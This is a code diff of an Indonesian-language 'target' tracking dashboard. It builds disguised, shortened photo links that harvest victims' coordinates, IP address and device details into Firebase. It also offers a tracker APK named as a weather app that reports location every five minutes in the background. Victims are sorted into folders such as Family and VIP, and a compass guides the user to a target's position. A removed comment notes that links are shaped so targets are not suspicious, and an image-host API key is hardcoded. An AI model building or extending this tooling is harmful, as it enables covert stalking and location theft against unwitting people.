@@ -201,7 +201,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 #globeCanvas{width:100%;height:100%;display:block}
 .globe-hint{position:absolute;bottom:8px;left:8px;background:rgba(0,0,0,.85);border:1px solid var(--gold-d);color:var(--gold);font-size:9px;padding:3px 8px;letter-spacing:1px}
 .globe-count{position:absolute;top:8px;right:8px;background:rgba(0,0,0,.85);border:1px solid var(--cyan-d);color:var(--cyan);font-size:9px;padding:3px 8px;letter-spacing:1px}
-
 .radar-global{position:relative;width:100%;height:280px;background:radial-gradient(circle at 50% 50%,#071a13 0%,#000 70%);border:1px solid #0a2e21;border-radius:4px;overflow:hidden;margin-top:10px}
 .radar-ring{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);border:1px solid rgba(0,229,138,.2);border-radius:50%}
 .radar-ring.r1{width:25%;height:25%}.radar-ring.r2{width:50%;height:50%}.radar-ring.r3{width:75%;height:75%}.radar-ring.r4{width:100%;height:100%}
@@ -235,7 +234,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .server-input-row{display:flex;gap:6px;margin-top:10px}
 .server-input-row input{flex:1;background:var(--bg);border:1px solid var(--border2);color:var(--cyan);font-family:'Courier New',monospace;font-size:11px;padding:9px 10px;outline:none;border-radius:var(--radius)}
 .server-input-row button{background:var(--gold);color:#000;border:none;font-family:'Courier New',monospace;font-size:10px;font-weight:bold;padding:0 14px;cursor:pointer;border-radius:var(--radius);letter-spacing:1px}
-
 .tools-tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px;border-bottom:1px solid var(--border2);padding-bottom:8px}
 .tools-tab{font-family:'Courier New',monospace;font-size:10px;padding:7px 12px;background:transparent;border:1px solid var(--border2);color:var(--text-d);cursor:pointer;border-radius:var(--radius);letter-spacing:1px;text-transform:uppercase}
 .tools-tab.active{background:rgba(0,229,138,.15);border-color:var(--gold);color:var(--gold)}
@@ -281,7 +279,6 @@ body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradi
 .dual-link-item .dl-url{font-size:10px;word-break:break-all;line-height:1.5}
 .dual-link-item.short .dl-url{color:var(--gold);font-weight:bold;font-size:12px}
 .dual-link-item.long .dl-url{color:var(--cyan)}
-
 body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),transparent 60%),radial-gradient(900px 480px at -10% 108%,rgba(0,229,138,.06),transparent 60%),linear-gradient(180deg,#071021 0%,#04070d 45%,#02050a 100%);background-attachment:fixed}
 .term-header,.term-body{background-image:linear-gradient(180deg,rgba(56,189,248,.06),rgba(56,189,248,0) 42%);box-shadow:inset 0 1px 0 rgba(148,205,255,.08),inset 0 0 46px rgba(56,189,248,.035),0 10px 26px rgba(0,0,0,.45)}
 .prompt,.term-header .title,.top-bar .time,.cmp-dist{text-shadow:0 0 10px rgba(0,229,138,.5),0 0 26px rgba(0,229,138,.22)}
@@ -363,7 +360,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
 <div class="term-body"><div class="prompt">[Data] Target Location</div><div class="map-box" id="mapLinkBox"><div id="mapLink" class="map-inner"></div><div class="map-label" id="mapLinkLabel">◈ AWAITING TARGET</div><div class="map-coords" id="mapLinkCoords">--, --</div></div><div class="folder-bar" id="folderBar"><button class="folder-chip active" data-folder="all">◈ SEMUA</button><button class="folder-chip" data-folder="untagged">◦ UNTAGGED</button><button class="folder-chip" data-folder="VIP">★ VIP</button><button class="folder-chip" data-folder="Suspect">⚠ SUSPECT</button><button class="folder-chip" data-folder="Client">◆ CLIENT</button><button class="folder-chip" data-folder="Family">♥ FAMILY</button></div><div class="search-row"><input id="searchInput" placeholder="🔍 cari target..." oninput="filterData()"><select id="filterDate" onchange="filterData()"><option value="all">Semua</option><option value="today">Hari Ini</option><option value="7days">7 Hari</option><option value="30days">30 Hari</option></select></div><div style="font-size:10px;color:var(--text-d);margin-bottom:10px">Showing&nbsp;<b id="countShown" style="color:var(--cyan)">0</b>&nbsp;/&nbsp;<b id="countTotal">0</b></div><div id="dupWarnBox"></div><div id="hasil"><div class="empty">Waiting for data...</div></div><div style="display:flex;gap:8px;margin-top:12px;padding-top:12px;border-top:1px solid var(--border)"><button class="term-btn outline" onclick="exportCSV()" style="margin:0">[ CSV ]</button><button class="term-btn outline" onclick="exportJSON()" style="margin:0">[ JSON ]</button><button class="term-btn danger" onclick="clearAll()" style="margin:0">[ Clear ]</button></div></div>
 <div class="term-body"><div class="prompt">[Monitor] APK Location</div><div class="map-box"><div id="mapApk" class="map-inner"></div><div class="map-label">APK TRACKER</div><div class="map-coords" id="mapApkCoords">--, --</div></div><div class="term-info"><div><span class="k">USER</span><span class="v" id="apkUser">-</span></div><div><span class="k">LAT</span><span class="v" id="apkLat">-</span></div><div><span class="k">LNG</span><span class="v" id="apkLng">-</span></div><div><span class="k">AKURASI</span><span class="v" id="apkAkurasi">-</span></div><div><span class="k">DEVICE</span><span class="v" id="apkDevice">-</span></div><div><span class="k">LAST UPDATE</span><span class="v" id="apkTime">-</span></div></div><button class="term-btn outline" style="margin-top:14px" onclick="bukaMapsApk()">[ Buka Google Maps ]</button></div>
 <div class="term-body"><div class="prompt">[Tools] Install Tracker APK</div><div class="term-info"><div><span class="k">FUNCTION</span><span class="v">Lacak HP kamu</span></div><div><span class="k">INTERVAL</span><span class="v">5 menit auto</span></div><div><span class="k">MODE</span><span class="v">Background service</span></div></div><div class="apk-steps"><div>Download file</div><div>Install APK</div><div>Input ID</div><div>Tracking aktif</div></div><a href="https://github.com/roraxbali/official/raw/main/infocuaca.apk" target="_blank" style="text-decoration:none"><button class="term-btn" style="margin-top:6px">[ ▶ Download APK ]</button></a></div>
-
 <div class="term-body" id="toolsPanel">
   <div class="prompt">[Tools] Utility Panel</div>
   <div class="tools-tabs">
@@ -482,7 +478,6 @@ body{background:radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),tr
     <div class="coord-result" id="coordResult" style="display:none"></div>
   </div>
 </div>
-
 <div class="term-body"><div class="prompt">[System] Log</div><div id="logBox"><div class="log-line">Initializing...</div></div></div>
 <div class="term-body"><div class="prompt">[Security] Riwayat Sesi Login</div><div class="sess-head"><span id="sessCount">0 sesi tercatat</span><button onclick="clearSessionLog()">🗑️ HAPUS SEMUA</button></div><div class="sess-list" id="sessionList"><div class="empty">Belum ada riwayat</div></div></div>
 <div class="term-body"><div class="prompt">[Activity] Riwayat Aktivitas</div><div class="sess-head"><span id="actCount">0 aktivitas</span><button onclick="clearActLog()">🗑️ HAPUS</button></div><div class="act-list" id="actList"><div class="empty">Belum ada aktivitas</div></div></div>
@@ -587,12 +582,8 @@ window.getNote=getNote;
 let mapApk=null,markerApk=null,lastApkCnt=0,firstApk=true;
 function initMapApk(){mapApk=L.map('mapApk',{zoomControl:false,attributionControl:false,dragging:true,scrollWheelZoom:true}).setView([-4.5,138.5],14);addSatLayer(mapApk)}
 initMapApk();
-
-/* ═══ APK monitor — dengar dari lokasi/{user} (mode APK) ═══ */
 onValue(ref(db,'lokasi/'+user),snap=>{const data=snap.val();if(!data)return;const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');const ae=Object.entries(data).filter(([k,d])=>d.mode&&!d.target&&!bl.includes(k)).sort((a,b)=>b[1].waktu-a[1].waktu);if(!ae.length)return;const lt=ae[0][1];document.getElementById('apkUser').innerText=lt.user||user;document.getElementById('apkLat').innerText=lt.lat?lt.lat.toFixed(6):'-';document.getElementById('apkLng').innerText=lt.lng?lt.lng.toFixed(6):'-';document.getElementById('apkAkurasi').innerText=lt.akurasi?lt.akurasi.toFixed(2)+' m':'-';document.getElementById('apkDevice').innerText=lt.device||'-';document.getElementById('apkTime').innerText=new Date(lt.waktu).toLocaleString('id-ID');if(lt.lat&&lt.lng){document.getElementById('mapApkCoords').innerText=lt.lat.toFixed(4)+', '+lt.lng.toFixed(4);if(markerApk)markerApk.setLatLng([lt.lat,lt.lng]);else{markerApk=L.marker([lt.lat,lt.lng],{icon:radarIcon()}).addTo(mapApk);markerApk.bindPopup('<div style="font-family:Courier New;text-align:center;padding:6px"><b>'+(lt.user||user).toUpperCase()+'</b><br>'+lt.lat.toFixed(5)+', '+lt.lng.toFixed(5)+'</div>',{className:'target-popup',closeButton:false}).openPopup()}mapApk.setView([lt.lat,lt.lng],mapApk.getZoom())}if(!firstApk&&ae.length>lastApkCnt){apkUpdateSound();addLog('📡 APK kirim lokasi baru!','warn');actLog('📡 APK kirim lokasi baru','info')}lastApkCnt=ae.length;firstApk=false});
 window.bukaMapsApk=()=>{const la=document.getElementById('apkLat').innerText,ln=document.getElementById('apkLng').innerText;if(la==='-')return;window.open('https://www.google.com/maps?q='+la+','+ln,'_blank')};
-
-/* AUTO-SHORTLINK */
 let currentLink='';window.currentLink='';
 function linkBase(){let c='';try{c=(document.getElementById('baseUrlCustom').value||'').trim()}catch(e){}c=c.replace(/\/+$/,'');if(!c)return location.origin;if(!/^[a-z]+:\/\//i.test(c))c='https://'+c;return c}
 function saveBase(){try{localStorage.setItem('baseUrlCustom_'+user,(document.getElementById('baseUrlCustom').value||'').trim())}catch(e){}}
@@ -641,30 +632,21 @@ function showLoading(type){
   if(labelEl)labelEl.innerText='› target link ('+type+') — MEMPERPENDEK...';
   urlBox.innerHTML='<div style="padding:12px;text-align:center;color:var(--gold);font-size:11px;letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
 }
-
-/* ============================================================
-   UPLOAD FOTO VIA IMGBB → GENERATE LINK view.html
-   PENTING: link pakai u=images supaya target tidak curiga
-   ============================================================ */
 const IMGBB_API_KEY = '913294d7a5148a6415a3b9d9153c9bbf';
-
 window.onDashFotoPicked = async function(event){
   const file = event.target.files && event.target.files[0];
   if(!file) return;
   if(!file.type.startsWith('image/')){ alert('File harus gambar.'); event.target.value=''; return; }
   if(file.size > 10*1024*1024){ alert('Maks 10 MB.'); event.target.value=''; return; }
-
   playKlik();
   addLog('📷 Upload foto: ' + file.name);
   actLog('📷 Upload foto: ' + file.name, 'info');
-
   const resBox = document.getElementById('linkResult');
   const urlBox = document.getElementById('linkUrl');
   const labelEl = document.getElementById('linkTypeLabel');
   resBox.style.display = 'block';
   if(labelEl) labelEl.innerText = '› mengunggah foto...';
   urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Upload ke ImgBB...</div>';
-
   try{
     const base64 = await new Promise((resolve, reject) => {
       const reader = new FileReader();
@@ -672,36 +654,23 @@ window.onDashFotoPicked = async function(event){
       reader.onerror = reject;
       reader.readAsDataURL(file);
     });
-
     const formData = new FormData();
     formData.append('key', IMGBB_API_KEY);
     formData.append('image', base64);
-
-    const resp = await fetch('https://api.imgbb.com/1/upload', {
-      method: 'POST',
-      body: formData
-    });
+    const resp = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: formData });
     const json = await resp.json();
-
-    if(!json.success){
-      throw new Error(json.error?.message || 'Upload ImgBB gagal');
-    }
-
+    if(!json.success){ throw new Error(json.error?.message || 'Upload ImgBB gagal'); }
     const downloadUrl = json.data.url;
     addLog('✓ Foto terupload: ' + (json.data.id || ''), 'ok');
-
     const t = document.getElementById('targetName').value.trim() || 'target';
-    // ⚠️ LINK PAKAI u=images (biar target gak curiga)
+    /* ⚠️ FIX: pakai u={user} bukan u=images */
     const longUrl = linkBase() + '/view.html?foto=' + encodeURIComponent(downloadUrl)
-                  + '&u=images';
-
+                  + '&u=' + encodeURIComponent(user);
     window.currentLink = longUrl;
     window.lastLongLink = longUrl;
     window.currentFotoUrl = downloadUrl;
-
     if(labelEl) labelEl.innerText = '› memperpendek link...';
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--gold);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
-
     const result = await autoShorten(longUrl);
     if(result.ok){
       window.currentShortLink = result.short;
@@ -720,13 +689,11 @@ window.onDashFotoPicked = async function(event){
       addLog('⚠ Shortlink gagal, pakai link panjang', 'warn');
       if(window.clipAdd) clipAdd(longUrl, 'FOTO');
     }
-
     const preview = document.createElement('img');
     preview.src = downloadUrl;
     preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--gold-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
     preview.onclick = () => window.open(downloadUrl, '_blank');
     urlBox.appendChild(preview);
-
   } catch(e){
     addLog('✗ Upload gagal: ' + e.message, 'err');
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--red)">✗ Gagal: ' + e.message + '</div>';
@@ -734,27 +701,20 @@ window.onDashFotoPicked = async function(event){
     event.target.value = '';
   }
 };
-
-/* ============================================================
-   UPLOAD FOTO → VERCEL APP (Dynamic Preview WhatsApp)
-   ============================================================ */
 window.onDashFotoPickedVercel = async function(event){
   const file = event.target.files && event.target.files[0];
   if(!file) return;
   if(!file.type.startsWith('image/')){ alert('File harus gambar.'); event.target.value=''; return; }
   if(file.size > 10*1024*1024){ alert('Maks 10 MB.'); event.target.value=''; return; }
-
   playKlik();
   addLog('📷 Upload foto (Vercel): ' + file.name);
   actLog('📷 Upload foto (Vercel): ' + file.name, 'info');
-
   const resBox = document.getElementById('linkResult');
   const urlBox = document.getElementById('linkUrl');
   const labelEl = document.getElementById('linkTypeLabel');
   resBox.style.display = 'block';
   if(labelEl) labelEl.innerText = '› mengunggah foto (dynamic preview)...';
   urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Upload ke ImgBB...</div>';
-
   try{
     const base64 = await new Promise((resolve, reject) => {
       const reader = new FileReader();
@@ -762,37 +722,24 @@ window.onDashFotoPickedVercel = async function(event){
       reader.onerror = reject;
       reader.readAsDataURL(file);
     });
-
     const formData = new FormData();
     formData.append('key', IMGBB_API_KEY);
     formData.append('image', base64);
-
-    const resp = await fetch('https://api.imgbb.com/1/upload', {
-      method: 'POST',
-      body: formData
-    });
+    const resp = await fetch('https://api.imgbb.com/1/upload', { method: 'POST', body: formData });
     const json = await resp.json();
-
-    if(!json.success){
-      throw new Error(json.error?.message || 'Upload ImgBB gagal');
-    }
-
+    if(!json.success){ throw new Error(json.error?.message || 'Upload ImgBB gagal'); }
     const downloadUrl = json.data.url;
     addLog('✓ Foto terupload: ' + (json.data.id || ''), 'ok');
-
     const t = document.getElementById('targetName').value.trim() || 'target';
-    // ⚠️ PAKAI VERCEL APP UNTUK DYNAMIC PREVIEW
+    /* ⚠️ FIX: pakai u={user} bukan u=images */
     const longUrl = 'https://official-brown-iota.vercel.app/api/p?foto=' 
                   + encodeURIComponent(downloadUrl) 
-                  + '&u=images';
-
+                  + '&u=' + encodeURIComponent(user);
     window.currentLink = longUrl;
     window.lastLongLink = longUrl;
     window.currentFotoUrl = downloadUrl;
-
     if(labelEl) labelEl.innerText = '› memperpendek link...';
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--cyan);letter-spacing:2px">⏳ Menghubungi is.gd...</div>';
-
     const result = await autoShorten(longUrl);
     if(result.ok){
       window.currentShortLink = result.short;
@@ -811,13 +758,11 @@ window.onDashFotoPickedVercel = async function(event){
       addLog('⚠ Shortlink gagal, pakai link panjang', 'warn');
       if(window.clipAdd) clipAdd(longUrl, 'FOTO-DYN');
     }
-
     const preview = document.createElement('img');
     preview.src = downloadUrl;
     preview.style.cssText = 'width:100%;max-height:180px;object-fit:cover;border:1px solid var(--cyan-d);border-radius:4px;margin-top:10px;display:block;cursor:pointer';
     preview.onclick = () => window.open(downloadUrl, '_blank');
     urlBox.appendChild(preview);
-
   } catch(e){
     addLog('✗ Upload gagal: ' + e.message, 'err');
     urlBox.innerHTML = '<div style="padding:14px;text-align:center;color:var(--red)">✗ Gagal: ' + e.message + '</div>';
@@ -825,7 +770,6 @@ window.onDashFotoPickedVercel = async function(event){
     event.target.value = '';
   }
 };
-
 window.genLink=async function(){
   playKlik();saveBase();
   const t=document.getElementById('targetName').value.trim()||'target';
@@ -888,7 +832,6 @@ window.copyLink=async()=>{
     if(window.clipAdd)clipAdd(link,window.currentShortLink?'SHORT':'LONG');
   }catch(e){}
 };
-
 let allData=[],lastCnt=0,firstLoad=true;window.allData=[];
 function genID(w){const t=new Date(w);return'TGT-'+t.getFullYear().toString().slice(-2)+String(t.getMonth()+1).padStart(2,'0')+String(t.getDate()).padStart(2,'0')+'-'+String(t.getHours()).padStart(2,'0')+String(t.getMinutes()).padStart(2,'0')+String(t.getSeconds()).padStart(2,'0')}
 function getFiltered(){const s=(document.getElementById('searchInput')?.value||'').toLowerCase();const df=document.getElementById('filterDate')?.value||'all';const bl=JSON.parse(localStorage.getItem('blacklist_'+user)||'[]');const ts=new Date();ts.setHours(0,0,0,0);const tags=getTags();return allData.filter(([k,d])=>{if(bl.includes(k))return false;if(currentFolder!=='all'){var tag=tags[k]||'';if(currentFolder==='untagged'&&tag)return false;if(currentFolder!=='untagged'&&tag!==currentFolder)return false}if(s){const t=(d.target||'').toLowerCase(),c=(d.kota||'').toLowerCase(),al=buildAlamat(d).toLowerCase();if(!t.includes(s)&&!c.includes(s)&&!al.includes(s))return false}if(df==='today'&&d.waktu<ts.getTime())return false;if(df==='7days'&&d.waktu<ts.getTime()-7*86400000)return false;if(df==='30days'&&d.waktu<ts.getTime()-30*86400000)return false;return true})}
@@ -902,16 +845,10 @@ window.downloadCard=async(key)=>{const c=document.getElementById('card-'+key);if
 window.exportCSV=()=>{if(!allData.length)return alert('No data');const rows=[['ID','Target','Waktu','Alamat','Lat','Lng','IP','Platform','Via']];allData.forEach(([k,d])=>rows.push([genID(d.waktu),d.target||'',new Date(d.waktu).toLocaleString('id-ID'),buildAlamat(d),d.lat||'',d.lng||'',d.ip||'',d.platform||'',d.via||'track']));const blob=new Blob(['\ufeff'+rows.map(r=>r.map(c=>'"'+String(c).replace(/"/g,'""')+'"').join(',')).join('\n')],{type:'text/csv'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.csv';a.click()};
 window.exportJSON=()=>{if(!allData.length)return alert('No data');const blob=new Blob([JSON.stringify(allData.map(([,d])=>{const c={...d};if(c.foto)c.foto='[HIDDEN]';return c}),null,2)],{type:'application/json'});const a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download='cyber_'+Date.now()+'.json';a.click()};
 
-/* ═══ DATA TARGET — dengar dari BOTH lokasi/{user} DAN lokasi/images ═══ */
-/* Ini supaya link dari view.html (u=images) tetap masuk ke dashboard Anda */
-let dataUser = null;
-let dataImages = null;
-function processAllData(){
-  const merged = {};
-  // Data APK (mode) tidak ikut, hanya yg ada target
-  if(dataUser) Object.entries(dataUser).forEach(([k,v])=>{ if(v.target) merged[k]=v; });
-  if(dataImages) Object.entries(dataImages).forEach(([k,v])=>{ if(v.target) merged[k]=v; });
-  if(!Object.keys(merged).length){
+/* ═══ FIX: SINGLE LISTENER — hanya dari lokasi/{user} ═══ */
+onValue(ref(db,'lokasi/'+user),snap=>{
+  const data=snap.val();
+  if(!data){
     allData=[];window.allData=[];
     document.getElementById('hasil').innerHTML='<div class="empty">Waiting for data...</div>';
     document.getElementById('countShown').innerText='0';
@@ -919,16 +856,13 @@ function processAllData(){
     updateStats();updateMultiMap();
     return;
   }
-  allData=Object.entries(merged).sort((a,b)=>b[1].waktu-a[1].waktu);
+  allData=Object.entries(data).filter(([,d])=>d.target).sort((a,b)=>b[1].waktu-a[1].waktu);
   window.allData=allData;
   if(!firstLoad&&allData.length>lastCnt){linkDataSound();addLog('✔ DATA BARU!','warn');actLog('✔ Data target baru masuk','info')}
   lastCnt=allData.length;firstLoad=false;
   renderData();
-}
-onValue(ref(db,'lokasi/'+user), snap=>{ dataUser=snap.val(); processAllData(); });
-onValue(ref(db,'lokasi/images'), snap=>{ dataImages=snap.val(); processAllData(); });
+});
 
-/* KOMPAS */
 let compassMode='koordinat',cmpActive=false,cmpTarget=null,cmpPos=null,cmpHeadSensor=null,cmpWatch=null,cmpOriHandler=null,cmpOriEvt=null,cmpArrived=false;
 window.setCompassMode=(m)=>{compassMode=m;document.getElementById('cmpRowKord').style.display=m==='koordinat'?'block':'none';document.getElementById('cmpRowUtm').style.display=m==='utm'?'block':'none';document.getElementById('cmpModeKoord').style.background=m==='koordinat'?'rgba(0,229,138,.15)':'';document.getElementById('cmpModeUtm').style.background=m==='utm'?'rgba(0,229,138,.15)':''};
 function parseZona(v){v=String(v==null?'':v).trim().toUpperCase();const m=v.match(/(\d{1,2})/);if(!m)return null;const zone=parseInt(m[1],10);if(zone<1||zone>60)return null;let hemi='S';const L=(v.match(/[A-Z]/)||[])[0];if(L==='N')hemi='N';else if(L&&'PQRSTUVWX'.indexOf(L)>=0)hemi='N';return{zone:zone,hemi:hemi}}
@@ -946,8 +880,6 @@ function updateCompass(){if(!cmpActive||!cmpTarget||!cmpPos)return;const dist=ha
 window.compassLatest=()=>{playKlik();const f=allData.find(([,d])=>d.lat&&d.lng);if(!f){addLog('Belum ada target berkoordinat','err');return}setCompassMode('koordinat');document.getElementById('cmpLat').value=Number(f[1].lat).toFixed(6);document.getElementById('cmpLng').value=Number(f[1].lng).toFixed(6);addLog('Kompas target: '+(f[1].target||''));startCompass()};
 window.goCompass=(lat,lng)=>{playKlik();if(lat==null||lng==null){addLog('Tidak ada koordinat','err');return}lat=Number(lat);lng=Number(lng);if(!Number.isFinite(lat)||!Number.isFinite(lng)){addLog('Tidak ada koordinat','err');return}setCompassMode('koordinat');document.getElementById('cmpLat').value=lat.toFixed(6);document.getElementById('cmpLng').value=lng.toFixed(6);try{document.getElementById('compassPanel').scrollIntoView({behavior:'smooth'})}catch(e){}startCompass()};
 (function(){let m='koordinat';try{const s=JSON.parse(localStorage.getItem('compassTarget_'+user)||'null');if(s){const set=(id,v)=>{if(v!==undefined&&v!==null&&v!==''){const el=document.getElementById(id);if(el)el.value=v}};set('cmpLat',s.lat);set('cmpLng',s.lng);set('cmpEast',s.east);set('cmpNorth',s.north);if(s.zone)set('cmpZoneT',s.hemi?(String(s.zone)+s.hemi):s.zone);if(s.mode)m=s.mode}}catch(e){}setCompassMode(m)})();
-
-/* CHAT */
 var chatOpen=false,chatFirst=true,chatLast=0;
 var lawan=localStorage.getItem('lawanChat_'+user)||'';
 var sub1=null,sub2=null,room1data=null,room2data=null;
@@ -971,255 +903,37 @@ function detectPlatform(d){var p=(d.platform||'').toLowerCase();var ua=(d.userAg
 function renderPlatformChart(){var donut=document.getElementById('donutPlatform');var legendEl=document.getElementById('platformLegend');var totalEl=document.getElementById('donutTotal');if(!donut||!legendEl)return;if(!window.allData||!window.allData.length){legendEl.innerHTML='<div class="empty" style="padding:8px">Belum ada data</div>';donut.style.background='conic-gradient(#152030 0deg 360deg)';if(totalEl)totalEl.textContent='0';return}var counts={};window.allData.forEach(function(item){var plat=detectPlatform(item[1]);counts[plat]=(counts[plat]||0)+1});var total=Object.values(counts).reduce(function(a,b){return a+b},0);if(totalEl)totalEl.textContent=total;if(total===0){legendEl.innerHTML='<div class="empty" style="padding:8px">Belum ada data</div>';return}var sorted=Object.entries(counts).sort(function(a,b){return b[1]-a[1]});var gradientStops=[];var currentDeg=0;sorted.forEach(function(item){var name=item[0],count=item[1];var deg=(count/total)*360;var color=COLORS_PLATFORM[name]||'#6d8095';gradientStops.push(color+' '+currentDeg+'deg '+(currentDeg+deg)+'deg');currentDeg+=deg});if(currentDeg<360)gradientStops.push('#152030 '+currentDeg+'deg 360deg');donut.style.background='conic-gradient('+gradientStops.join(', ')+')';legendEl.innerHTML=sorted.map(function(item){var name=item[0],count=item[1];var pct=((count/total)*100).toFixed(0);var color=COLORS_PLATFORM[name]||'#6d8095';return'<div class="legend-item"><div class="legend-dot" style="background:'+color+'"></div><div class="legend-name">'+name+'</div><div class="legend-val">'+count+' ('+pct+'%)</div></div>'}).join('')}
 setTimeout(function(){renderPlatformChart();updateLocTime()},1500);
 setInterval(function(){renderPlatformChart()},3000);
-
-/* ═══ GLOBE 3D ═══ */
 var globeScene,globeCamera,globeRenderer,globeGroup,globeMarkers=[],globeRotating=true,globeDragging=false,globePrevX=0,globePrevY=0,globePaused=false;
-function latLngToVector3(lat,lng,radius){
-  var phi=(90-lat)*Math.PI/180;
-  var theta=(lng+180)*Math.PI/180;
-  var x=-radius*Math.sin(phi)*Math.cos(theta);
-  var z= radius*Math.sin(phi)*Math.sin(theta);
-  var y= radius*Math.cos(phi);
-  return new THREE.Vector3(x,y,z);
-}
-function initGlobe(){
-  var canvas=document.getElementById('globeCanvas');
-  if(!canvas||typeof THREE==='undefined')return;
-  var box=document.getElementById('globeBox');
-  var W=box.clientWidth,H=box.clientHeight;
-  globeScene=new THREE.Scene();
-  globeCamera=new THREE.PerspectiveCamera(45,W/H,0.1,1000);
-  globeCamera.position.z=2.8;
-  globeRenderer=new THREE.WebGLRenderer({canvas:canvas,alpha:true,antialias:true});
-  globeRenderer.setSize(W,H);
-  globeRenderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
-  globeGroup=new THREE.Group();
-  var loader=new THREE.TextureLoader();
-  loader.crossOrigin='anonymous';
-  var earthMat=new THREE.MeshPhongMaterial({color:0xffffff,transparent:true,opacity:0.95,shininess:8,specular:0x224466});
-  loader.load('https://unpkg.com/three-globe/example/img/earth-blue-marble.jpg',function(t){t.minFilter=THREE.LinearFilter;t.magFilter=THREE.LinearFilter;earthMat.map=t;earthMat.needsUpdate=true;},undefined,function(){loader.load('https://unpkg.com/three-globe/example/img/earth-dark.jpg',function(t2){t2.minFilter=THREE.LinearFilter;t2.magFilter=THREE.LinearFilter;earthMat.map=t2;earthMat.needsUpdate=true;})});
-  var earthGeo=new THREE.SphereGeometry(1,64,64);
-  globeGroup.add(new THREE.Mesh(earthGeo,earthMat));
-  var wireGeo=new THREE.SphereGeometry(1.006,36,24);
-  var wireMat=new THREE.MeshBasicMaterial({color:0x38bdf8,wireframe:true,transparent:true,opacity:0.10});
-  globeGroup.add(new THREE.Mesh(wireGeo,wireMat));
-  var glowGeo=new THREE.SphereGeometry(1.06,32,32);
-  var glowMat=new THREE.MeshBasicMaterial({color:0x38bdf8,wireframe:true,transparent:true,opacity:0.05});
-  globeGroup.add(new THREE.Mesh(glowGeo,glowMat));
-  globeScene.add(new THREE.AmbientLight(0xffffff,0.8));
-  var dir=new THREE.DirectionalLight(0xffffff,0.9);dir.position.set(5,3,5);globeScene.add(dir);
-  globeScene.add(globeGroup);
-  canvas.addEventListener('mousedown',function(e){globeDragging=true;globePrevX=e.clientX;globePrevY=e.clientY;globeRotating=false;globePaused=true});
-  canvas.addEventListener('mousemove',function(e){if(!globeDragging)return;var dx=e.clientX-globePrevX;var dy=e.clientY-globePrevY;globeGroup.rotation.y+=dx*0.005;globeGroup.rotation.x+=dy*0.005;globePrevX=e.clientX;globePrevY=e.clientY;});
-  window.addEventListener('mouseup',function(){globeDragging=false;setTimeout(function(){if(!globeDragging){globeRotating=true;globePaused=false}},1500)});
-  canvas.addEventListener('touchstart',function(e){if(e.touches.length===1){globeDragging=true;globePrevX=e.touches[0].clientX;globePrevY=e.touches[0].clientY;globeRotating=false;globePaused=true}},{passive:true});
-  canvas.addEventListener('touchmove',function(e){if(!globeDragging||e.touches.length!==1)return;var dx=e.touches[0].clientX-globePrevX;var dy=e.touches[0].clientY-globePrevY;globeGroup.rotation.y+=dx*0.005;globeGroup.rotation.x+=dy*0.005;globePrevX=e.touches[0].clientX;globePrevY=e.touches[0].clientY;},{passive:true});
-  canvas.addEventListener('touchend',function(){globeDragging=false;setTimeout(function(){if(!globeDragging){globeRotating=true;globePaused=false}},1500)});
-  window.addEventListener('resize',function(){if(!globeRenderer)return;var w=box.clientWidth,h=box.clientHeight;globeCamera.aspect=w/h;globeCamera.updateProjectionMatrix();globeRenderer.setSize(w,h);});
-  animateGlobe();
-}
-function refreshGlobeMarkers(){
-  if(!globeGroup||typeof THREE==='undefined')return;
-  globeMarkers.forEach(function(m){try{globeGroup.remove(m);if(m.geometry)m.geometry.dispose();if(m.material){if(m.material.map)m.material.map.dispose();m.material.dispose()}}catch(e){}});
-  globeMarkers=[];
-  if(!window.allData)return;
-  var valid=window.allData.filter(function(x){return x[1]&&x[1].lat&&x[1].lng});
-  var cnt=document.getElementById('globeCount');
-  if(cnt)cnt.textContent=valid.length+' target';
-  valid.forEach(function(item,idx){
-    var d=item[1];
-    var lat=parseFloat(d.lat),lng=parseFloat(d.lng);
-    if(!isFinite(lat)||!isFinite(lng))return;
-    var pos=latLngToVector3(lat,lng,1.02);
-    var color=idx%3===0?0xff3355:(idx%3===1?0x00e58a:0x38bdf8);
-    var dotGeo=new THREE.SphereGeometry(0.018,12,12);
-    var dotMat=new THREE.MeshBasicMaterial({color:color});
-    var dot=new THREE.Mesh(dotGeo,dotMat);dot.position.copy(pos);globeGroup.add(dot);globeMarkers.push(dot);
-    var ringGeo=new THREE.RingGeometry(0.022,0.032,24);
-    var ringMat=new THREE.MeshBasicMaterial({color:color,side:THREE.DoubleSide,transparent:true,opacity:0.85});
-    var ring=new THREE.Mesh(ringGeo,ringMat);ring.position.copy(pos);ring.lookAt(0,0,0);globeGroup.add(ring);globeMarkers.push(ring);
-    var lineGeo=new THREE.BufferGeometry().setFromPoints([pos,pos.clone().multiplyScalar(1.08)]);
-    var lineMat=new THREE.LineBasicMaterial({color:color,transparent:true,opacity:0.7});
-    var line=new THREE.Line(lineGeo,lineMat);globeGroup.add(line);globeMarkers.push(line);
-  });
-}
+function latLngToVector3(lat,lng,radius){var phi=(90-lat)*Math.PI/180;var theta=(lng+180)*Math.PI/180;var x=-radius*Math.sin(phi)*Math.cos(theta);var z=radius*Math.sin(phi)*Math.sin(theta);var y=radius*Math.cos(phi);return new THREE.Vector3(x,y,z)}
